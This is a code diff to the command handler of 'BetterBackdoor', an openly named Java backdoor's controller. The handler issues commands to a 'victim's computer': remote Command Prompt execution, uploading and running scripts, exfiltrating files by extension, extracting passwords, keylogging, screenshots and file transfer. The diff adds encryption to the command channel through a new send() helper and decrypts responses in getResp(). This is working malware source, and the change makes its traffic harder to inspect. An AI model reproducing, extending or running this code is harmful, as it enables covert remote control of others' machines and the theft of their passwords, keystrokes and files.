@@ -2,12 +2,18 @@ package dev.thatcherclough.betterbackdoor.shell;
 
 import java.io.File;
 import java.io.IOException;
+import java.security.InvalidKeyException;
+import java.security.NoSuchAlgorithmException;
 
 import dev.thatcherclough.betterbackdoor.BetterBackdoor;
 import dev.thatcherclough.betterbackdoor.backend.FTP;
 import dev.thatcherclough.betterbackdoor.backend.Utils;
 
 import org.apache.commons.io.FileUtils;
+
+import javax.crypto.BadPaddingException;
+import javax.crypto.IllegalBlockSizeException;
+import javax.crypto.NoSuchPaddingException;
 
 public class HandleCommand {
 
@@ -17,18 +23,19 @@ public class HandleCommand {
 	 * @param command command given by user
 	 * @throws IOException
 	 */
-	public static void handle(String command) throws IOException, ClassNotFoundException {
+	public static void handle(String command) throws IOException, ClassNotFoundException, InvalidKeyException, BadPaddingException, NoSuchAlgorithmException,
+			IllegalBlockSizeException, NoSuchPaddingException {
 		switch (command) {
 			case "cmd":
 				System.out.println(
 						"Commands will now be executed through vitim's computer's Command Prompt\nEnter 'back' to go back");
 				while (true) {
-					Shell.out.writeObject("current-cmd-dir");
+					send("current-cmd-dir");
 					System.out.print(getResp());
 					String cmdCommand = BetterBackdoor.getInput("");
 					if (cmdCommand.equals("back"))
 						break;
-					Shell.out.writeObject("cmd " + cmdCommand);
+					send("cmd " + cmdCommand);
 					Shell.out.flush();
 					System.out.println(getResp());
 				}
@@ -44,12 +51,12 @@ public class HandleCommand {
 				System.out.println("Enter local filepath of script:");
 				File file = new File(BetterBackdoor.getInput("file"));
 				System.out.println("Sending script...");
-				Shell.out.writeObject("filesend " + file.getName());
+				send("filesend " + file.getName());
 				Shell.out.flush();
 				FTP.shell(file.getAbsolutePath(), "send");
 				System.out.println(getResp());
 				System.out.println("Running script...");
-				Shell.out.writeObject(command + " " + file.getName());
+				send(command + " " + file.getName());
 				System.out.println(getResp());
 				break;
 			}
@@ -59,7 +66,7 @@ public class HandleCommand {
 								"and delete the original ZIP file from the victim's computer.");
 				System.out.println("Enter victim's directory to search through:");
 				String root = BetterBackdoor.getInput("");
-				Shell.out.writeObject("filetype " + root);
+				send("filetype " + root);
 				Shell.out.flush();
 				String filetype = getResp();
 				if (filetype.equals("file")) {
@@ -69,7 +76,7 @@ public class HandleCommand {
 				} else {
 					System.out.println("Enter extensions of files separated by commas (i.e. txt,pdf,docx)");
 					String exts = BetterBackdoor.getInput("");
-					Shell.out.writeObject("exfiles " + root + "*" + exts);
+					send("exfiles " + root + "*" + exts);
 					Shell.out.flush();
 					System.out.println("Receiving files to '" + System.getProperty("user.dir") + File.separator + "gathered"
 							+ File.separator + "ExfiltartedFiles.zip'...");
@@ -79,7 +86,7 @@ public class HandleCommand {
 				break;
 			}
 			case "expass":
-				Shell.out.writeObject("expass");
+				send("expass");
 				Shell.out.flush();
 				System.out.println("Receiving passwords to '" + System.getProperty("user.dir") + File.separator + "gathered"
 						+ File.separator + "ExfiltratedPasswords.zip'...");
@@ -101,7 +108,7 @@ public class HandleCommand {
 
 				if (file.exists()) {
 					String fileRec = BetterBackdoor.getInput("");
-					Shell.out.writeObject("filesend " + fileRec);
+					send("filesend " + fileRec);
 					Shell.out.flush();
 					if (file.isDirectory()) {
 						Utils.zipDir(file.getAbsolutePath());
@@ -118,7 +125,7 @@ public class HandleCommand {
 				System.out.println("Enter victim's filepath of file to send:");
 				String fileSend = BetterBackdoor.getInput("");
 
-				Shell.out.writeObject("filetype " + fileSend);
+				send("filetype " + fileSend);
 				Shell.out.flush();
 				String filetype = getResp();
 				if (filetype.equals("file"))
@@ -131,7 +138,7 @@ public class HandleCommand {
 
 				if (!filetype.equals("not real")) {
 					String fileRec = BetterBackdoor.getInput("");
-					Shell.out.writeObject("filerec " + fileSend);
+					send("filerec " + fileSend);
 					Shell.out.flush();
 					FTP.shell(fileRec, "rec");
 					System.out.println(getResp());
@@ -139,10 +146,10 @@ public class HandleCommand {
 				break;
 			}
 			case "keylog":
-				Shell.out.writeObject("current-dir");
+				send("current-dir");
 				Shell.out.flush();
 				String currentDrive = getResp().substring(0, 2);
-				Shell.out.writeObject("cmd echo %USERNAME%");
+				send("cmd echo %USERNAME%");
 				Shell.out.flush();
 				String currentUser = getResp().replaceAll(" ", "");
 
@@ -156,12 +163,12 @@ public class HandleCommand {
 					if (dirChoice.equals("1"))
 						logFileDir = currentDrive;
 				}
-				Shell.out.writeObject("keylog " + logFileDir);
+				send("keylog " + logFileDir);
 				Shell.out.flush();
 				System.out.println(getResp());
 				break;
 			case "ss":
-				Shell.out.writeObject("ss");
+				send("ss");
 				Shell.out.flush();
 				System.out.println("Receiving screenshot to '" + System.getProperty("user.dir") + File.separator
 						+ "gathered" + File.separator + "screenshot.png'...");
@@ -170,30 +177,38 @@ public class HandleCommand {
 				break;
 			case "cat":
 				System.out.println("Enter victim's filepath of file to get contents of:");
-				Shell.out.writeObject("cat " + BetterBackdoor.getInput(""));
+				send("cat " + BetterBackdoor.getInput(""));
 				Shell.out.flush();
 				System.out.println(getResp());
 				break;
 			case "zip":
 				System.out.println("Enter victim's filepath of directory to compress:");
-				Shell.out.writeObject("zip " + BetterBackdoor.getInput(""));
+				send("zip " + BetterBackdoor.getInput(""));
 				Shell.out.flush();
 				System.out.println(getResp());
 				break;
 			case "unzip":
 				System.out.println("Enter victim's filepath of ZIP file to decompress:");
-				Shell.out.writeObject("unzip " + BetterBackdoor.getInput(""));
+				send("unzip " + BetterBackdoor.getInput(""));
 				Shell.out.flush();
 				System.out.println(getResp());
 				break;
 			case "exit":
 				System.exit(0);
 			default:
-				Shell.out.writeObject(command);
+				send(command);
 				Shell.out.flush();
 				System.out.println(getResp());
 				break;
 		}
+	}
+
+	private static void send(String toSend) throws IOException, IllegalBlockSizeException, InvalidKeyException, BadPaddingException, NoSuchAlgorithmException,
+			NoSuchPaddingException {
+		if (Shell.key != null)
+			Shell.out.writeObject(Utils.encrypt(toSend, Shell.key));
+		else
+			Shell.out.writeObject(toSend);
 	}
 
 	/**
@@ -201,7 +216,15 @@ public class HandleCommand {
 	 *
 	 * @return response from client
 	 */
-	private static String getResp() throws IOException, ClassNotFoundException {
-		return (String) Shell.in.readObject();
+	private static String getResp() throws IOException, ClassNotFoundException, IllegalBlockSizeException, InvalidKeyException, BadPaddingException, NoSuchAlgorithmException
+			, NoSuchPaddingException {
+		String ret;
+		String resp = (String) Shell.in.readObject();
+		if (Shell.key != null)
+			ret = Utils.decrypt(resp, Shell.key);
+		else
+			ret = resp;
+
+		return ret;
 	}
 }
